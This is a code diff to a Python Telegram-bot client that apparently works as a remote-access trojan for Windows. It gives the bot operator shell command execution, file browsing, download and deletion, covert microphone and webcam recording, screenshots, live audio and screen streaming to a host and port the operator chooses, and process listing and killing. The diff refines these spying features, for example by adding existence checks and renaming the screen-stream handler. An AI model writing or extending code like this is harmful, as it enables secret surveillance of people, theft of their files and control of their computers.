@@ -10,6 +10,8 @@ import os
 import time
 import sys
 
+import subprocess
+
 
 import numpy as np
 
@@ -18,7 +20,6 @@ from subprocess import Popen, PIPE
 from threading import Thread
 from telebot import TeleBot
 from ctypes  import windll
-
 
 
 """ Fn """
@@ -53,10 +54,10 @@ class Client:
 		self.CHANNELS = 1
 		self.CHUNK = 8192
 		
-		self.filename_recorded_microphone = "ofline_recorded_microphone.wav"
-		self.filename_recorded_microphone_dump = "ofline_recorded_microphone_dump.dat"
-		self.filename_unpacked_dump_recorded_microphone = "unpacked_dump__ofline_recorded_microphone.wav"
-		self.filename_video = "ofline_recorded_video.avi"
+		self.filename_recorded_microphone = "../ofline_recorded_microphone.wav"
+		self.filename_recorded_microphone_dump = "../ofline_recorded_microphone_dump.dat"
+		self.filename_unpacked_dump_recorded_microphone = "../unpacked_dump__ofline_recorded_microphone.wav"
+		self.filename_video = "../ofline_recorded_video.avi"
 
 	def create_markup(self, ms, filename):
 		markup = ReplyKeyboardMarkup()
@@ -223,32 +224,35 @@ class Client:
 
 		bot.register_next_step_handler(ms, record_audio_next)
 
-	def get_audio(self, ms):
-		with open(self.filename_recorded_microphone_dump, "rb") as dump_in:
-			unpickler = pickle.Unpickler(dump_in)
-			frame = unpickler.load()
+	def get_dump_audio(self, ms):
+		if os.path.exists(self.filename_recorded_microphone_dump):
+			with open(self.filename_recorded_microphone_dump, "rb") as dump_in:
+				unpickler = pickle.Unpickler(dump_in)
+				frame = unpickler.load()
 
-			p = pyaudio.PyAudio()
-			stream = p.open(format=self.FORMAT,
-							channels=self.CHANNELS,
-							rate=self.RATE,
-							input=True,
-							output=True,
-							frames_per_buffer=self.CHUNK)
+				p = pyaudio.PyAudio()
+				stream = p.open(format=self.FORMAT,
+								channels=self.CHANNELS,
+								rate=self.RATE,
+								input=True,
+								output=True,
+								frames_per_buffer=self.CHUNK)
 
-			wf = wave.open(self.filename_unpacked_dump_recorded_microphone, "wb")
-			wf.setnchannels(self.CHANNELS)
-			wf.setsampwidth(p.get_sample_size(self.FORMAT))
-			wf.setframerate(self.RATE)
-			wf.writeframes(b"".join(frame))
-			wf.close()
+				wf = wave.open(self.filename_unpacked_dump_recorded_microphone, "wb")
+				wf.setnchannels(self.CHANNELS)
+				wf.setsampwidth(p.get_sample_size(self.FORMAT))
+				wf.setframerate(self.RATE)
+				wf.writeframes(b"".join(frame))
+				wf.close()
 
-		with open(self.filename_unpacked_dump_recorded_microphone, "rb") as audio:
-			bot.send_message(ms.chat.id, "Unpacked ✅", reply_markup=markup)
-			bot.send_audio(ms.chat.id, audio)
+			with open(self.filename_unpacked_dump_recorded_microphone, "rb") as audio:
+				bot.send_message(ms.chat.id, "Unpacked ✅", reply_markup=markup)
+				bot.send_audio(ms.chat.id, audio)
 
-		os.remove(self.filename_recorded_microphone_dump)
-		os.remove(self.filename_unpacked_dump_recorded_microphone)
+			os.remove(self.filename_recorded_microphone_dump)
+			os.remove(self.filename_unpacked_dump_recorded_microphone)
+		else:
+			bot.send_message(ms.chat.id, "Dump audio not found ❌")
 
 
 	def record_video(self, ms):
@@ -273,32 +277,22 @@ class Client:
 				video.write(frame)
 
 	def get_video(self, ms):
-		markup_video = self.create_markup(ms, "paths")
-		bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_video)
+		if os.path.exists(self.filename_video):
+			with open(self.filename_video, "rb") as video:
+				bot.send_video(ms.chat.id, video)
 
-		@bot.message_handler(content_types=["text"])
-		def get_video_next(ms):
-			if ms.text != "EXIT":
-				try:
-					bot.send_message(ms.chat.id, "Sending a video 🎲", reply_markup=markup)
-					with open(ms.text, "rb") as video:
-						bot.send_video(ms.chat.id, video)
-					os.remove(ms.text)
-				except Exception as e:
-					bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
-			else:
-				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
-
-		bot.register_next_step_handler(ms, get_video_next)
+			os.remove(self.filename_video)
+		else:
+			bot.send_message(ms.chat.id, "Video not found ❌")
 
 
-	def get_screen(self, ms):
+	def get_broadcast(self, ms):
 		markup_get_screen = ReplyKeyboardMarkup()
 		markup_get_screen.add("EXIT")
 		bot.send_message(ms.chat.id, "Enter port, host...", reply_markup=markup_get_screen)
 		
 		@bot.message_handler(content_types=["text"])
-		def getscreen_next(ms):
+		def get_broadcast_next(ms):
 			if ms.text != "EXIT":
 				try:
 					list_data = ms.text.split()
@@ -336,7 +330,7 @@ class Client:
 			else:
 				bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
-		bot.register_next_step_handler(ms, getscreen_next)
+		bot.register_next_step_handler(ms, get_broadcast_next)
 
 	def screenshot(self, ms):
 		myScreenshot = pyautogui.screenshot()
@@ -394,7 +388,7 @@ class Client:
 						input=True,
 						output=True,
 						frames_per_buffer=self.CHUNK)
-		
+  
 		frames = []
 		for i in range(int(self.RATE / self.CHUNK * time)):
 			data = stream.read(self.CHUNK)
@@ -426,7 +420,6 @@ class Client:
 			server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			server_socket_m.connect((HOST, PORT))
 		except Exception as e:
-			bot.send_message(ms.chat.id, f"Error __listening_microphone__❌\n{e}", reply_markup=markup)
 			return
 
 		while __running:
@@ -444,7 +437,7 @@ class Client:
 
 
 """ Variables """
-API_TOKEN = "token"
+API_TOKEN = ""
 ADMIN_ID = id
 
 bot = TeleBot(API_TOKEN)
@@ -453,9 +446,9 @@ markup = ReplyKeyboardMarkup(True, True)
 markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
 		KeyboardButton("dir"), KeyboardButton("rm_file"),
 		KeyboardButton("exec_cmd"), KeyboardButton("get_file"),
-		KeyboardButton("record_microphone"), KeyboardButton("get_audio"),
+		KeyboardButton("record_microphone"), KeyboardButton("get_dump_audio"),
 		KeyboardButton("record_video"), KeyboardButton("get_video"),
-		KeyboardButton("get_screen"), KeyboardButton("screenshot"),
+		KeyboardButton("get_broadcast"), KeyboardButton("screenshot"),
 		KeyboardButton("tasklist"), KeyboardButton("taskkill"))
 
 
@@ -470,10 +463,10 @@ methods = {
 	"exec_cmd": client.exec_cmd,
 	"get_file": client.get_file,
 	"record_microphone": client.record_microphone,
-	"get_audio": client.get_audio,
+	"get_dump_audio": client.get_dump_audio,
 	"record_video": client.record_video,
 	"get_video": client.get_video,
-	"get_screen": client.get_screen,
+	"get_broadcast": client.get_broadcast,
 	"screenshot": client.screenshot,
 	"tasklist": client.tasklist,
 	"taskkill": client.taskkill,
